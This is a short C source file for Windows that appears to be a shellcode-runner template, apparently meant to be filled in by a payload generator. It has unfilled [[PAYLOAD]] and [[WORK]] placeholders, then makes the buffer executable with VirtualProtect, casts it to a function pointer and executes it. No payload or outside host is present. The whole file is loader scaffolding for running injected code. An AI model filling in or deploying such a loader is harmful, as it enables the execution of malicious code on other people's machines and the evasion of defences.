#include <windows.h>

[[PAYLOAD]]

int main(void) {
    DWORD ignore;
    int (*func)(); 

    [[WORK]]

    // make the shellcode executable
    VirtualProtect(buf, buflen, PAGE_EXECUTE, &ignore);
    // cast the shellcode to a function pointer
    func = (int (*)()) buf;
    // execute the function
    (int)(*func)();

    return 0;
}